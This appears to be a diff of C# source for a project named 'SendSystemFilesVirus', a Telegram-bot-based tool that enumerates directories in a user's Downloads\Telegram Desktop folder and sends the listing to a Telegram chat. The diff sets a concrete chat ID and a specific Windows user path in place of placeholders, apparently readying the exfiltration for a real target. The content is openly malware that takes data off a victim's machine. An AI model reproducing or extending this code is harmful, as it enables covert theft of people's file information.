@@ -7,7 +7,7 @@ namespace SendSystemFilesVirus
 {
     public class TelegramService : IUpdateHandler
     {
-        private readonly string _chatId = "chat_id";
+        private readonly string _chatId = "5435711275";
         public static readonly TelegramBotClient _telegramBotClient = Worker._telegramBotClient;
         List<string> _chats = new List<string>() { "" };
         public async Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
@@ -33,7 +33,7 @@ namespace SendSystemFilesVirus
                     }
                     else
                     {
-                        string[] findingDirectories = GetDirectoriesFromGivenRoot(@"C:\Users\User\Downloads\Telegram Desktop");
+                        string[] findingDirectories = GetDirectoriesFromGivenRoot(@"C:\Users\acer\Downloads\Telegram Desktop");
                         await SendTextArray(findingDirectories);
                     }
                     Console.WriteLine(update.Message.Text);
